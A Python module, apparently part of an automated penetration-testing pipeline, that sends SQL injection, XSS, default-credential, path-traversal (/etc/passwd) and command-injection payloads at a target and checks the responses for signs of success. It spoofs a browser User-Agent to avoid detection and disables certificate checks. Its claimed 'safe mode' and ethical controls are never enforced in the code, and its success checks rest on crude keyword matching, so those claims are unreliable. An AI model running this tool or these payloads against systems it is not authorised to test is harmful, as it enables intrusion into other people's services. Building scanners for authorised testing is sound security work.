#!/usr/bin/env python3
"""
Exploit Tester Runner for Stage 4: Step 4.4

This module implements safe exploit testing and verification with ethical controls,
non-destructive testing, and adaptive testing based on AI analysis results.
"""

import json
import logging
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Any, Union
import asyncio
import concurrent.futures

import httpx
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

logger = logging.getLogger(__name__)


@dataclass
class ExploitTest:
    """Represents an exploit test configuration."""
    
    test_id: str
    finding_id: str
    vulnerability_type: str
    target_url: str
    payload: str
    method: str = "GET"
    parameters: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    expected_response: Optional[str] = None
    safe_mode: bool = True
    max_attempts: int = 3
    timeout: int = 30


@dataclass
class ExploitResult:
    """Represents the result of an exploit test."""
    
    test_id: str
    finding_id: str
    confirmed: bool
    evidence_files: List[str] = field(default_factory=list)
    extracted_data: Optional[str] = None
    response_code: Optional[int] = None
    response_time: Optional[float] = None
    error_message: Optional[str] = None
    test_duration: float = 0.0
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)


class ExploitTester:
    """Safe exploit tester for vulnerability verification."""
    
    def __init__(self, config):
        self.config = config
        self.output_dir = Path(f"outputs/{config.stage_name}/{config.target}")
        self.exploit_dir = self.output_dir / "exploit_testing"
        self.exploit_dir.mkdir(parents=True, exist_ok=True)
        
        # Exploit testing configuration
        self.safe_exploit_mode = config.safe_exploit_mode
        self.max_exploit_attempts = config.max_exploit_attempts
        self.rate_limit = config.rate_limit
        
        # Test results
        self.exploit_results: List[ExploitResult] = []
        
        # HTTP client
        self.http_client = httpx.AsyncClient(
            timeout=30.0,
            follow_redirects=True,
            verify=False  # For testing purposes
        )
        
        # Browser driver (for web-based exploits)
        self.browser_driver = None
        
        # Exploit templates
        self.exploit_templates = self._initialize_exploit_templates()
        
        # Success/failure indicators
        self.success_indicators = {
            "sql_injection": [
                "sql syntax", "mysql error", "oracle error", "postgresql error",
                "union select", "database", "table", "column"
            ],
            "xss": [
                "<script>", "javascript:", "alert(", "confirm(", "prompt(",
                "onerror=", "onload=", "onclick="
            ],
            "authentication_bypass": [
                "admin", "root", "dashboard", "panel", "welcome",
                "unauthorized access", "bypass", "privilege"
            ],
            "information_disclosure": [
                "version", "build", "environment", "debug", "config",
                "database", "secret", "key", "token", "password"
            ],
            "command_injection": [
                "uid=", "gid=", "groups=", "whoami", "id",
                "ls -la", "dir", "pwd", "hostname"
            ]
        }
        
        self.failure_indicators = {
            "sql_injection": [
                "invalid syntax", "syntax error", "parse error",
                "access denied", "permission denied"
            ],
            "xss": [
                "forbidden", "blocked", "filtered", "sanitized",
                "content security policy", "xss protection"
            ],
            "authentication_bypass": [
                "login required", "authentication failed", "access denied",
                "unauthorized", "forbidden"
            ],
            "information_disclosure": [
                "not found", "404", "500", "error", "exception"
            ],
            "command_injection": [
                "command not found", "permission denied", "access denied",
                "invalid command", "syntax error"
            ]
        }
    
    def _initialize_exploit_templates(self) -> Dict[str, List[Dict[str, Any]]]:
        """Initialize exploit templates for different vulnerability types."""
        templates = {
            "sql_injection": [
                {
                    "name": "Basic SQL Injection",
                    "payload": "' OR 1=1--",
                    "method": "GET",
                    "parameter": "id",
                    "expected_response": "sql syntax"
                },
                {
                    "name": "Union SQL Injection",
                    "payload": "' UNION SELECT NULL--",
                    "method": "GET",
                    "parameter": "id",
                    "expected_response": "union"
                },
                {
                    "name": "Boolean SQL Injection",
                    "payload": "' AND 1=1--",
                    "method": "GET",
                    "parameter": "id",
                    "expected_response": "true"
                }
            ],
            "xss": [
                {
                    "name": "Basic XSS",
                    "payload": "<script>alert('XSS')</script>",
                    "method": "GET",
                    "parameter": "search",
                    "expected_response": "<script>"
                },
                {
                    "name": "Image XSS",
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "method": "GET",
                    "parameter": "search",
                    "expected_response": "<img"
                },
                {
                    "name": "JavaScript XSS",
                    "payload": "javascript:alert('XSS')",
                    "method": "GET",
                    "parameter": "url",
                    "expected_response": "javascript:"
                }
            ],
            "authentication_bypass": [
                {
                    "name": "Default Credentials",
                    "payload": "admin:admin",
                    "method": "POST",
                    "parameter": "credentials",
                    "expected_response": "welcome"
                },
                {
                    "name": "Common Credentials",
                    "payload": "admin:password",
                    "method": "POST",
                    "parameter": "credentials",
                    "expected_response": "dashboard"
                }
            ],
            "information_disclosure": [
                {
                    "name": "Directory Traversal",
                    "payload": "../../../etc/passwd",
                    "method": "GET",
                    "parameter": "file",
                    "expected_response": "root:"
                },
                {
                    "name": "Version Disclosure",
                    "payload": "/version",
                    "method": "GET",
                    "parameter": "path",
                    "expected_response": "version"
                }
            ],
            "command_injection": [
                {
                    "name": "Basic Command Injection",
                    "payload": "; ls -la",
                    "method": "POST",
                    "parameter": "command",
                    "expected_response": "total"
                },
                {
                    "name": "Whoami Command",
                    "payload": "| whoami",
                    "method": "POST",
                    "parameter": "command",
                    "expected_response": "uid="
                }
            ]
        }
        
        return templates
    
    def test_vulnerability(self, finding: Any) -> ExploitResult:
        """
        Test a vulnerability finding safely.
        
        Args:
            finding: Vulnerability finding to test
            
        Returns:
            ExploitResult: Result of the exploit test
        """
        logger.info(f"Testing vulnerability: {finding.title}")
        
        try:
            # Create exploit test configuration
            exploit_test = self._create_exploit_test(finding)
            
            if not exploit_test:
                logger.warning(f"No exploit test created for finding: {finding.title}")
                return ExploitResult(
                    test_id=f"test_{len(self.exploit_results) + 1}",
                    finding_id=finding.id,
                    confirmed=False,
                    error_message="No exploit test configuration available"
                )
            
            # Run the exploit test
            result = self._run_exploit_test(exploit_test)
            
            # Save result
            self.exploit_results.append(result)
            
            logger.info(f"Exploit test completed for {finding.title}. Confirmed: {result.confirmed}")
            
            return result
            
        except Exception as e:
            logger.error(f"Error testing vulnerability {finding.title}: {str(e)}")
            return ExploitResult(
                test_id=f"test_{len(self.exploit_results) + 1}",
                finding_id=finding.id,
                confirmed=False,
                error_message=str(e)
            )
    
    def _create_exploit_test(self, finding: Any) -> Optional[ExploitTest]:
        """Create exploit test configuration for a finding."""
        try:
            # Determine vulnerability type
            vuln_type = self._determine_vulnerability_type(finding)
            
            if not vuln_type or vuln_type not in self.exploit_templates:
                logger.warning(f"No exploit templates available for vulnerability type: {vuln_type}")
                return None
            
            # Get exploit template
            template = self.exploit_templates[vuln_type][0]  # Use first template
            
            # Create test configuration
            test_id = f"test_{len(self.exploit_results) + 1}"
            
            exploit_test = ExploitTest(
                test_id=test_id,
                finding_id=finding.id,
                vulnerability_type=vuln_type,
                target_url=finding.endpoint if hasattr(finding, 'endpoint') else f"https://{self.config.target}",
                payload=template["payload"],
                method=template["method"],
                parameters={template["parameter"]: template["payload"]},
                expected_response=template["expected_response"],
                safe_mode=self.safe_exploit_mode,
                max_attempts=self.max_exploit_attempts,
                timeout=30
            )
            
            return exploit_test
            
        except Exception as e:
            logger.error(f"Error creating exploit test: {str(e)}")
            return None
    
    def _determine_vulnerability_type(self, finding: Any) -> Optional[str]:
        """Determine vulnerability type from finding."""
        # Try to get from finding attributes
        if hasattr(finding, 'vulnerability_type') and finding.vulnerability_type:
            return finding.vulnerability_type.lower().replace(' ', '_')
        
        # Try to determine from title/description
        finding_text = f"{finding.title} {finding.description}".lower()
        
        if "sql" in finding_text or "injection" in finding_text:
            return "sql_injection"
        elif "xss" in finding_text or "cross-site" in finding_text:
            return "xss"
        elif "auth" in finding_text or "bypass" in finding_text:
            return "authentication_bypass"
        elif "information" in finding_text or "disclosure" in finding_text:
            return "information_disclosure"
        elif "command" in finding_text or "execution" in finding_text:
            return "command_injection"
        
        return None
    
    def _run_exploit_test(self, exploit_test: ExploitTest) -> ExploitResult:
        """Run an exploit test safely."""
        start_time = time.time()
        
        try:
            logger.info(f"Running exploit test: {exploit_test.test_id}")
            
            # Initialize result
            result = ExploitResult(
                test_id=exploit_test.test_id,
                finding_id=exploit_test.finding_id,
                confirmed=False
            )
            
            # Run test based on method
            if exploit_test.method.upper() == "GET":
                test_result = self._run_get_exploit(exploit_test)
            elif exploit_test.method.upper() == "POST":
                test_result = self._run_post_exploit(exploit_test)
            else:
                test_result = self._run_custom_exploit(exploit_test)
            
            # Update result
            result.confirmed = test_result["confirmed"]
            result.response_code = test_result.get("response_code")
            result.response_time = test_result.get("response_time")
            result.extracted_data = test_result.get("extracted_data")
            result.success_indicators = test_result.get("success_indicators", [])
            result.failure_indicators = test_result.get("failure_indicators", [])
            result.evidence_files = test_result.get("evidence_files", [])
            
            # Calculate test duration
            result.test_duration = time.time() - start_time
            
            # Rate limiting
            time.sleep(1 / self.rate_limit)
            
            return result
            
        except Exception as e:
            logger.error(f"Error running exploit test: {str(e)}")
            return ExploitResult(
                test_id=exploit_test.test_id,
                finding_id=exploit_test.finding_id,
                confirmed=False,
                error_message=str(e),
                test_duration=time.time() - start_time
            )
    
    def _run_get_exploit(self, exploit_test: ExploitTest) -> Dict[str, Any]:
        """Run GET-based exploit test."""
        try:
            # Prepare request
            url = exploit_test.target_url
            params = exploit_test.parameters
            headers = exploit_test.headers
            
            # Add user agent to avoid detection
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            
            logger.info(f"Testing GET exploit: {url} with params: {params}")
            
            # Make request
            start_time = time.time()
            response = requests.get(url, params=params, headers=headers, timeout=exploit_test.timeout)
            response_time = time.time() - start_time
            
            # Analyze response
            analysis_result = self._analyze_exploit_response(
                response, exploit_test.vulnerability_type, exploit_test.expected_response
            )
            
            # Save evidence
            evidence_files = self._save_exploit_evidence(exploit_test, response, analysis_result)
            
            return {
                "confirmed": analysis_result["confirmed"],
                "response_code": response.status_code,
                "response_time": response_time,
                "extracted_data": analysis_result.get("extracted_data"),
                "success_indicators": analysis_result.get("success_indicators", []),
                "failure_indicators": analysis_result.get("failure_indicators", []),
                "evidence_files": evidence_files
            }
            
        except Exception as e:
            logger.error(f"Error in GET exploit test: {str(e)}")
            return {
                "confirmed": False,
                "error_message": str(e)
            }
    
    def _run_post_exploit(self, exploit_test: ExploitTest) -> Dict[str, Any]:
        """Run POST-based exploit test."""
        try:
            # Prepare request
            url = exploit_test.target_url
            data = exploit_test.parameters
            headers = exploit_test.headers
            
            # Add content type for POST
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            
            logger.info(f"Testing POST exploit: {url} with data: {data}")
            
            # Make request
            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, timeout=exploit_test.timeout)
            response_time = time.time() - start_time
            
            # Analyze response
            analysis_result = self._analyze_exploit_response(
                response, exploit_test.vulnerability_type, exploit_test.expected_response
            )
            
            # Save evidence
            evidence_files = self._save_exploit_evidence(exploit_test, response, analysis_result)
            
            return {
                "confirmed": analysis_result["confirmed"],
                "response_code": response.status_code,
                "response_time": response_time,
                "extracted_data": analysis_result.get("extracted_data"),
                "success_indicators": analysis_result.get("success_indicators", []),
                "failure_indicators": analysis_result.get("failure_indicators", []),
                "evidence_files": evidence_files
            }
            
        except Exception as e:
            logger.error(f"Error in POST exploit test: {str(e)}")
            return {
                "confirmed": False,
                "error_message": str(e)
            }
    
    def _run_custom_exploit(self, exploit_test: ExploitTest) -> Dict[str, Any]:
        """Run custom exploit test (e.g., browser-based)."""
        try:
            # For XSS and other browser-based exploits
            if exploit_test.vulnerability_type == "xss":
                return self._run_xss_exploit(exploit_test)
            else:
                # Fallback to GET request
                return self._run_get_exploit(exploit_test)
                
        except Exception as e:
            logger.error(f"Error in custom exploit test: {str(e)}")
            return {
                "confirmed": False,
                "error_message": str(e)
            }
    
    def _run_xss_exploit(self, exploit_test: ExploitTest) -> Dict[str, Any]:
        """Run XSS exploit test using browser automation."""
        try:
            # Initialize browser if not already done
            if not self.browser_driver:
                self._initialize_browser()
            
            if not self.browser_driver:
                logger.warning("Browser not available, falling back to GET request")
                return self._run_get_exploit(exploit_test)
            
            # Prepare URL with XSS payload
            url = exploit_test.target_url
            params = exploit_test.parameters
            param_name = list(params.keys())[0]
            payload = params[param_name]
            
            # Construct URL with payload
            if "?" in url:
                test_url = f"{url}&{param_name}={payload}"
            else:
                test_url = f"{url}?{param_name}={payload}"
            
            logger.info(f"Testing XSS exploit: {test_url}")
            
            # Navigate to URL
            start_time = time.time()
            self.browser_driver.get(test_url)
            
            # Wait for page to load
            WebDriverWait(self.browser_driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            response_time = time.time() - start_time
            
            # Get page source
            page_source = self.browser_driver.page_source
            
            # Check for XSS indicators
            xss_indicators = self.success_indicators.get("xss", [])
            success_found = any(indicator in page_source for indicator in xss_indicators)
            
            # Check for failure indicators
            failure_indicators = self.failure_indicators.get("xss", [])
            failure_found = any(indicator in page_source for indicator in failure_indicators)
            
            # Determine if exploit was successful
            confirmed = success_found and not failure_found
            
            # Save screenshot as evidence
            evidence_files = []
            if confirmed:
                screenshot_path = self.exploit_dir / f"xss_{exploit_test.test_id}.png"
                self.browser_driver.save_screenshot(str(screenshot_path))
                evidence_files.append(str(screenshot_path))
            
            return {
                "confirmed": confirmed,
                "response_time": response_time,
                "extracted_data": page_source[:1000] if confirmed else None,  # First 1000 chars
                "success_indicators": [indicator for indicator in xss_indicators if indicator in page_source],
                "failure_indicators": [indicator for indicator in failure_indicators if indicator in page_source],
                "evidence_files": evidence_files
            }
            
        except Exception as e:
            logger.error(f"Error in XSS exploit test: {str(e)}")
            return {
                "confirmed": False,
                "error_message": str(e)
            }
    
    def _initialize_browser(self):
        """Initialize browser driver for web-based exploits."""
        try:
            # Try to initialize Chrome in headless mode
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            
            self.browser_driver = webdriver.Chrome(options=options)
            logger.info("Browser driver initialized successfully")
            
        except Exception as e:
            logger.warning(f"Could not initialize browser driver: {str(e)}")
            self.browser_driver = None
    
    def _analyze_exploit_response(self, response, vuln_type: str, expected_response: str) -> Dict[str, Any]:
        """Analyze exploit response for success indicators."""
        try:
            response_text = response.text.lower()
            
            # Get success and failure indicators
            success_indicators = self.success_indicators.get(vuln_type, [])
            failure_indicators = self.failure_indicators.get(vuln_type, [])
            
            # Check for success indicators
            found_success = []
            for indicator in success_indicators:
                if indicator.lower() in response_text:
                    found_success.append(indicator)
            
            # Check for failure indicators
            found_failure = []
            for indicator in failure_indicators:
                if indicator.lower() in response_text:
                    found_failure.append(indicator)
            
            # Check for expected response
            expected_found = False
            if expected_response and expected_response.lower() in response_text:
                expected_found = True
            
            # Determine if exploit was successful
            confirmed = (len(found_success) > 0 or expected_found) and len(found_failure) == 0
            
            # Extract relevant data if successful
            extracted_data = None
            if confirmed:
                # Extract relevant portion of response
                start_idx = max(0, response_text.find(found_success[0]) - 100)
                end_idx = min(len(response_text), start_idx + 500)
                extracted_data = response_text[start_idx:end_idx]
            
            return {
                "confirmed": confirmed,
                "extracted_data": extracted_data,
                "success_indicators": found_success,
                "failure_indicators": found_failure,
                "expected_found": expected_found
            }
            
        except Exception as e:
            logger.error(f"Error analyzing exploit response: {str(e)}")
            return {
                "confirmed": False,
                "error_message": str(e)
            }
    
    def _save_exploit_evidence(self, exploit_test: ExploitTest, response, analysis_result: Dict[str, Any]) -> List[str]:
        """Save exploit evidence to files."""
        evidence_files = []
        
        try:
            # Save response content
            response_file = self.exploit_dir / f"response_{exploit_test.test_id}.txt"
            with open(response_file, 'w', encoding='utf-8') as f:
                f.write(f"URL: {exploit_test.target_url}\n")
                f.write(f"Method: {exploit_test.method}\n")
                f.write(f"Parameters: {exploit_test.parameters}\n")
                f.write(f"Headers: {exploit_test.headers}\n")
                f.write(f"Status Code: {response.status_code}\n")
                f.write(f"Response Headers: {dict(response.headers)}\n")
                f.write(f"Response Body:\n{response.text}\n")
                f.write(f"Analysis Result: {analysis_result}\n")
            
            evidence_files.append(str(response_file))
            
            # Save analysis result as JSON
            analysis_file = self.exploit_dir / f"analysis_{exploit_test.test_id}.json"
            with open(analysis_file, 'w') as f:
                json.dump(analysis_result, f, indent=2)
            
            evidence_files.append(str(analysis_file))
            
        except Exception as e:
            logger.error(f"Error saving exploit evidence: {str(e)}")
        
        return evidence_files
    
    def run_adaptive_testing(self, findings: List[Any]) -> List[ExploitResult]:
        """
        Run adaptive testing based on AI analysis results.
        
        Args:
            findings: List of vulnerability findings with AI analysis
            
        Returns:
            List[ExploitResult]: Results of adaptive testing
        """
        logger.info("Starting adaptive exploit testing...")
        
        try:
            results = []
            
            # Sort findings by AI risk score (highest first)
            sorted_findings = sorted(
                findings, 
                key=lambda x: getattr(x, 'ai_risk_score', 0.0), 
                reverse=True
            )
            
            # Test findings with highest risk scores first
            for finding in sorted_findings:
                if getattr(finding, 'ai_risk_score', 0.0) > 0.7:  # High risk threshold
                    logger.info(f"Testing high-risk finding: {finding.title} (AI score: {getattr(finding, 'ai_risk_score', 0.0):.2f})")
                    
                    result = self.test_vulnerability(finding)
                    results.append(result)
                    
                    # If confirmed, prioritize similar findings
                    if result.confirmed:
                        similar_findings = self._find_similar_findings(finding, sorted_findings)
                        for similar_finding in similar_findings[:3]:  # Test up to 3 similar findings
                            logger.info(f"Testing similar finding: {similar_finding.title}")
                            similar_result = self.test_vulnerability(similar_finding)
                            results.append(similar_result)
            
            logger.info(f"Adaptive testing completed. Tested {len(results)} vulnerabilities")
            
            return results
            
        except Exception as e:
            logger.error(f"Error in adaptive testing: {str(e)}")
            return []
    
    def _find_similar_findings(self, target_finding: Any, all_findings: List[Any]) -> List[Any]:
        """Find similar findings based on vulnerability type and characteristics."""
        try:
            similar_findings = []
            target_type = getattr(target_finding, 'vulnerability_type', '')
            target_endpoint = getattr(target_finding, 'endpoint', '')
            
            for finding in all_findings:
                if finding.id == target_finding.id:
                    continue
                
                # Check if same vulnerability type
                if getattr(finding, 'vulnerability_type', '') == target_type:
                    similar_findings.append(finding)
                
                # Check if same endpoint
                elif getattr(finding, 'endpoint', '') == target_endpoint:
                    similar_findings.append(finding)
            
            return similar_findings
            
        except Exception as e:
            logger.error(f"Error finding similar findings: {str(e)}")
            return []
    
    def run_parallel_testing(self, findings: List[Any], max_workers: int = 3) -> List[ExploitResult]:
        """
        Run parallel exploit testing with rate limiting.
        
        Args:
            findings: List of vulnerability findings to test
            max_workers: Maximum number of parallel workers
            
        Returns:
            List[ExploitResult]: Results of parallel testing
        """
        logger.info(f"Starting parallel exploit testing with {max_workers} workers...")
        
        try:
            results = []
            
            # Use ThreadPoolExecutor for parallel execution
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submit all tests
                future_to_finding = {
                    executor.submit(self.test_vulnerability, finding): finding 
                    for finding in findings
                }
                
                # Collect results as they complete
                for future in concurrent.futures.as_completed(future_to_finding):
                    finding = future_to_finding[future]
                    try:
                        result = future.result()
                        results.append(result)
                        logger.info(f"Completed test for {finding.title}: {result.confirmed}")
                    except Exception as e:
                        logger.error(f"Error testing {finding.title}: {str(e)}")
                        results.append(ExploitResult(
                            test_id=f"test_{len(results) + 1}",
                            finding_id=finding.id,
                            confirmed=False,
                            error_message=str(e)
                        ))
            
            logger.info(f"Parallel testing completed. Tested {len(results)} vulnerabilities")
            
            return results
            
        except Exception as e:
            logger.error(f"Error in parallel testing: {str(e)}")
            return []
    
    def verify_exploit_results(self, results: List[ExploitResult]) -> List[ExploitResult]:
        """
        Verify and validate exploit test results.
        
        Args:
            results: List of exploit test results
            
        Returns:
            List[ExploitResult]: Verified results
        """
        logger.info("Verifying exploit test results...")
        
        try:
            verified_results = []
            
            for result in results:
                # Additional verification for confirmed exploits
                if result.confirmed:
                    # Verify evidence files exist
                    valid_evidence = []
                    for evidence_file in result.evidence_files:
                        if Path(evidence_file).exists():
                            valid_evidence.append(evidence_file)
                        else:
                            logger.warning(f"Evidence file not found: {evidence_file}")
                    
                    result.evidence_files = valid_evidence
                    
                    # Verify extracted data is meaningful
                    if result.extracted_data and len(result.extracted_data.strip()) < 10:
                        logger.warning(f"Extracted data seems too short: {result.extracted_data}")
                        result.extracted_data = None
                    
                    # Check for false positive indicators
                    if self._check_false_positive_indicators(result):
                        logger.info(f"Potential false positive detected for {result.finding_id}")
                        result.confirmed = False
                        result.error_message = "False positive indicators detected"
                
                verified_results.append(result)
            
            logger.info(f"Verification completed. {len([r for r in verified_results if r.confirmed])} confirmed exploits")
            
            return verified_results
            
        except Exception as e:
            logger.error(f"Error verifying exploit results: {str(e)}")
            return results
    
    def _check_false_positive_indicators(self, result: ExploitResult) -> bool:
        """Check for false positive indicators in exploit result."""
        try:
            # Check for common false positive patterns
            false_positive_patterns = [
                "test", "demo", "example", "sample", "intentional",
                "expected", "normal", "debug", "development", "staging"
            ]
            
            if result.extracted_data:
                for pattern in false_positive_patterns:
                    if pattern in result.extracted_data.lower():
                        return True
            
            # Check for too many success indicators (might indicate false positive)
            if len(result.success_indicators) > 5:
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error checking false positive indicators: {str(e)}")
            return False
    
    def cleanup(self):
        """Clean up resources after testing."""
        try:
            # Close browser driver
            if self.browser_driver:
                self.browser_driver.quit()
                self.browser_driver = None
            
            # Close HTTP client
            if self.http_client:
                self.http_client.close()
            
            logger.info("Exploit tester cleanup completed")
            
        except Exception as e:
            logger.error(f"Error during cleanup: {str(e)}")
    
    def save_results(self):
        """Save exploit testing results to files."""
        try:
            # Save exploit results
            results_file = self.exploit_dir / "exploit_results.json"
            with open(results_file, 'w') as f:
                json.dump([result.__dict__ for result in self.exploit_results], f, indent=2)
            
            # Save summary
            summary = {
                "total_tests": len(self.exploit_results),
                "confirmed_exploits": len([r for r in self.exploit_results if r.confirmed]),
                "failed_tests": len([r for r in self.exploit_results if not r.confirmed]),
                "average_test_duration": sum(r.test_duration for r in self.exploit_results) / len(self.exploit_results) if self.exploit_results else 0,
                "test_timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            summary_file = self.exploit_dir / "exploit_summary.json"
            with open(summary_file, 'w') as f:
                json.dump(summary, f, indent=2)
            
            logger.info(f"Exploit testing results saved to {self.exploit_dir}")
            
        except Exception as e:
            logger.error(f"Error saving exploit testing results: {str(e)}") 